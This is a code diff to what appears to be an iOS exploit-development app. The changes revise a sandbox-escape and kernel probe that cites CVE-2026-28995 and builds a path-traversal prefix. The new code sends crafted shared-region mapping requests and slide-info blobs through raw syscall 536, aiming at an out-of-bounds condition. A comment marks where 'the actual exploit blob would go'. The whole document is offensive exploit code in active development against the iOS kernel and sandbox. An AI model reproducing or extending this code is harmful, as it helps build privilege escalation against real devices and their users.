@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v230)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v231)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v230: two-step first-mapper probe ===\n"];
+        [self appendLog:@"\n=== Rie v231: fd=-1 param diagnostic (vm_allocate blob, clean addr) ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9563,129 +9563,101 @@ static uint64_t rie_find_exec_base(task_t task,
             }
         }
 
-        // ── Phase D-3: Two-step first-mapper probe ──
-        // Theory: nf=0,nm=1 creates mapping → become first-mapper
-        //         then nf=1(fd=-1),nm=1 injects slide-info → triggers OOB
-        [self appendLog:@"\n── Phase D-3: two-step first-mapper probe ──"];
-        // Resolve vm_region_recurse locally (Phase B's var not in scope yet)
-        Rie_VMRegionRecurseFn vm_region_rec_d3 = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
-        if (vm_region_rec_d3) {
-            // Step 0: Scan for gaps in shared region (0x180000000 - 0x200000000)
-            rie_mach_vm_address_t gapAddr = 0;
-            rie_mach_vm_size_t gapSize = 0;
-            rie_mach_vm_address_t walk = 0x180000000ULL;
-            rie_mach_vm_size_t lastEnd = 0x180000000ULL;
-            for (int ri = 0; ri < 128; ri++) {
-                rie_vm_region_info_t info; memset(info, 0, sizeof(info));
-                rie_mach_vm_size_t vmsize = 0;
-                natural_t depth = 1;
-                mach_msg_type_number_t cnt = sizeof(info) / sizeof(natural_t);
-                if (vm_region_rec_d3(mach_task_self(), &walk, &vmsize, &depth,
-                    (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) {
-                    // No more regions → gap from lastEnd to 0x200000000
-                    if (0x200000000ULL > lastEnd + 0x10000) {
-                        gapAddr = lastEnd + 0x1000; // page-align past last region
-                        gapSize = 0x200000000ULL - gapAddr;
+        // ── Phase D-3: fd=-1 diagnostic — find correct params ──
+        // Hypothesis: errno=4 (not EPERM) means fd=-1 path might work
+        // without first-mapper status, but params are wrong
+        [self appendLog:@"\n── Phase D-3: fd=-1 param diagnostic ──"];
+        {
+            // Resolve vm_region_recurse locally
+            Rie_VMRegionRecurseFn vrr = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
+
+            // Allocate a clean page-aligned blob via vm_allocate for valid kernel copyin
+            uint8_t *blob = NULL;
+            vm_size_t blobSz = 0x4000;
+            kern_return_t kr = vm_allocate(mach_task_self(), (vm_address_t*)&blob, blobSz, VM_FLAGS_ANYWHERE);
+            if (kr == KERN_SUCCESS && blob) {
+                memset(blob, 0, blobSz);
+                *(uint32_t*)(blob) = 5;        // version 5
+                *(uint32_t*)(blob+4) = 0x4000; // page_size (delta_mask=0 for probe)
+
+                // Find the END of the last dyld region for a clean address
+                rie_mach_vm_address_t cleanAddr = 0x1f9000000ULL; // default: high, past known regions
+                if (vrr) {
+                    rie_mach_vm_address_t w = 0x180000000ULL;
+                    rie_mach_vm_size_t lastEnd = 0x180000000ULL;
+                    for (int ri = 0; ri < 128; ri++) {
+                        rie_vm_region_info_t info; memset(info, 0, sizeof(info));
+                        rie_mach_vm_size_t vs = 0;
+                        natural_t d = 1;
+                        mach_msg_type_number_t cnt = sizeof(info)/sizeof(natural_t);
+                        if (vrr(mach_task_self(), &w, &vs, &d,
+                            (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
+                        if (w > lastEnd) lastEnd = w + vs;
+                        w += vs;
+                        if (w >= 0x200000000ULL) break;
                     }
-                    break;
+                    // Page-align past last mapped region
+                    cleanAddr = (lastEnd + 0xFFF) & ~0xFFFULL;
+                    if (cleanAddr < 0x1f9000000ULL) cleanAddr = 0x1f9000000ULL;
+                    if (cleanAddr + 0x4000 > 0x200000000ULL) cleanAddr = 0x1ff000000ULL;
                 }
-                if (walk > lastEnd && (walk - lastEnd) >= 0x10000) {
-                    // Found a gap of at least 64KB between regions
-                    gapAddr = lastEnd;
-                    gapSize = walk - lastEnd;
-                    [self appendLog:[NSString stringWithFormat:@"  gap at 0x%llx+0x%llx (between regions)",
-                        (unsigned long long)gapAddr, (unsigned long long)gapSize]];
-                    break; // use first gap found
-                }
-                lastEnd = walk + vmsize;
-                walk += vmsize;
-                if (walk >= 0x200000000ULL) break;
-            }
-            if (gapAddr && gapSize >= 0x4000) {
-                [self appendLog:[NSString stringWithFormat:@"  chosen gap: 0x%llx+0x%llx",
-                    (unsigned long long)gapAddr, (unsigned long long)gapSize]];
-                // Step 1: Create initial mapping (nf=0, nm=1) — try to become first mapper
-                struct rie_sr_mapping *s1map = calloc(1, sizeof(struct rie_sr_mapping));
-                if (s1map) {
-                    s1map->sms_address = gapAddr;
-                    s1map->sms_size = 0x4000;
-                    s1map->sms_max_prot = 5;
-                    s1map->sms_init_prot = 3;
-                    s1map->sms_file_offset = 0;
-                    s1map->sms_slide_size = 0;
-                    s1map->sms_slide_start = 0;
-                    errno = 0;
-                    long r1 = sc(536, 0, NULL, 1, s1map);
-                    [self appendLog:[NSString stringWithFormat:
-                        @"  Step1: nf=0 nm=1 at 0x%llx → ret=%ld errno=%d",
-                        (unsigned long long)gapAddr, r1, errno]];
+                [self appendLog:[NSString stringWithFormat:@"  clean probe address: 0x%llx", (unsigned long long)cleanAddr]];
 
-                    if (r1 == 0) {
-                        // Step 2: Re-map with fd=-1 + custom slide-info (nf=1, nm=1)
-                        [self appendLog:@"  Step1 OK! Attempting Step2 with fd=-1 + slide-info..."];
+                #define T536D(nf,files,nm,maps,desc) do { \
+                    errno = 0; \
+                    long _r = sc(536, (long)(nf), (files), (long)(nm), (maps)); \
+                    [self appendLog:[NSString stringWithFormat: \
+                        @"  %-48s nf=%lld nm=%lld → ret=%ld errno=%d", \
+                        desc, (long long)(nf), (long long)(nm), _r, errno]]; \
+                } while(0)
 
-                        // Prepare blob page with minimal slide-info v5
-                        uint8_t *blob = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE,
-                            MAP_ANON|MAP_PRIVATE, -1, 0);
-                        if (blob && blob != MAP_FAILED) {
-                            memset(blob, 0, 0x4000);
-                            *(uint32_t*)(blob) = 5;        // version 5
-                            *(uint32_t*)(blob+4) = 0x4000; // page_size
-                            // Minimal v5 header: page_size, delta_mask, etc.
-                            // The actual exploit blob would go here — for now just probe
+                struct rie_sr_file tf_d3;
+                struct rie_sr_mapping tm_d3;
+                memset(&tf_d3, 0, sizeof(tf_d3));
+                memset(&tm_d3, 0, sizeof(tm_d3));
 
-                            struct rie_sr_file *s2file = calloc(1, sizeof(struct rie_sr_file));
-                            struct rie_sr_mapping *s2map = calloc(1, sizeof(struct rie_sr_mapping));
-                            if (s2file && s2map) {
-                                s2file->sf_fd = -1;
-                                s2file->sf_mappings_count = 1;
-                                s2file->sf_slide = 0;
+                // Test 1: nf=1 fd=-1 nm=0 (baseline — should work)
+                tf_d3.sf_fd = -1; tf_d3.sf_mappings_count = 0; tf_d3.sf_slide = 0;
+                T536D(1, &tf_d3, 0, NULL, "1: fd=-1 mc=0 nm=0");
 
-                                s2map->sms_address = gapAddr;
-                                s2map->sms_size = 0x4000;
-                                s2map->sms_file_offset = (uint64_t)(uintptr_t)blob;
-                                s2map->sms_slide_size = 0;    // no slide in Step2a
-                                s2map->sms_slide_start = 0;
-                                s2map->sms_max_prot = 5;
-                                s2map->sms_init_prot = 3;
+                // Test 2: nf=0 nm=1 at clean addr (establish mapping without files)
+                tm_d3.sms_address = cleanAddr;
+                tm_d3.sms_size = 0x4000;
+                tm_d3.sms_max_prot = 5; tm_d3.sms_init_prot = 3;
+                tm_d3.sms_file_offset = 0;
+                tm_d3.sms_slide_size = 0; tm_d3.sms_slide_start = 0;
+                T536D(0, NULL, 1, &tm_d3, "2: nf=0 nm=1 at clean addr");
 
-                                errno = 0;
-                                long r2a = sc(536, 1, s2file, 1, s2map);
-                                [self appendLog:[NSString stringWithFormat:
-                                    @"  Step2a: fd=-1 + mapping (no slide) → ret=%ld errno=%d", r2a, errno]];
+                // Test 3: nf=1 fd=-1 nm=1 at clean addr (foff=blob VA)
+                tf_d3.sf_fd = -1; tf_d3.sf_mappings_count = 1;
+                tm_d3.sms_file_offset = (uint64_t)(uintptr_t)blob;
+                T536D(1, &tf_d3, 1, &tm_d3, "3: fd=-1 nm=1 foff=blob");
 
-                                // Step2b: with slide-info
-                                s2map->sms_slide_size = 64; // small slide-info
-                                s2map->sms_slide_start = (uint64_t)(uintptr_t)blob;
-                                errno = 0;
-                                long r2b = sc(536, 1, s2file, 1, s2map);
-                                [self appendLog:[NSString stringWithFormat:
-                                    @"  Step2b: fd=-1 + mapping WITH slide → ret=%ld errno=%d", r2b, errno]];
+                // Test 4: foff=0 (kernel copies from mapping addr itself?)
+                tm_d3.sms_file_offset = 0;
+                T536D(1, &tf_d3, 1, &tm_d3, "4: fd=-1 nm=1 foff=0");
 
-                                // Step2c: try with sms_file_offset=0 (data from mapping address itself)
-                                s2map->sms_file_offset = 0;
-                                s2map->sms_slide_size = 64;
-                                s2map->sms_slide_start = (uint64_t)(uintptr_t)blob;
-                                errno = 0;
-                                long r2c = sc(536, 1, s2file, 1, s2map);
-                                [self appendLog:[NSString stringWithFormat:
-                                    @"  Step2c: fd=-1 foff=0 slide → ret=%ld errno=%d", r2c, errno]];
+                // Test 5: with slide-info at blob
+                tm_d3.sms_slide_size = 64;
+                tm_d3.sms_slide_start = (uint64_t)(uintptr_t)blob;
+                T536D(1, &tf_d3, 1, &tm_d3, "5: fd=-1 nm=1 slide=64");
 
-                                // Step2d: 0 files + 1 mapping again (verify still works)
-                                errno = 0;
-                                long r2d = sc(536, 0, NULL, 1, s2map);
-                                [self appendLog:[NSString stringWithFormat:
-                                    @"  Step2d: nf=0 nm=1 (verify) → ret=%ld errno=%d", r2d, errno]];
-                            }
-                            if (s2file) free(s2file);
-                            if (s2map) free(s2map);
-                            munmap(blob, 0x4000);
-                        }
-                    }
-                    free(s1map);
-                }
+                // Test 6: foff=0 + slide
+                tm_d3.sms_file_offset = 0;
+                T536D(1, &tf_d3, 1, &tm_d3, "6: fd=-1 nm=1 foff=0 slide=64");
+
+                // Test 7: Try with 8-byte file struct (no sf_slide field)
+                // The real kernel struct might be just 8 bytes
+                struct { int fd; uint32_t mc; } tf_short;
+                tf_short.fd = -1; tf_short.mc = 1;
+                tm_d3.sms_file_offset = 0;
+                tm_d3.sms_slide_size = 0; tm_d3.sms_slide_start = 0;
+                T536D(1, &tf_short, 1, &tm_d3, "7: 8B file struct (no slide)");
+
+                #undef T536D
+                vm_deallocate(mach_task_self(), (vm_address_t)blob, blobSz);
             } else {
-                [self appendLog:@"  no suitable gap found in shared region"];
+                [self appendLog:@"  vm_allocate failed for blob page"];
             }
         }
 
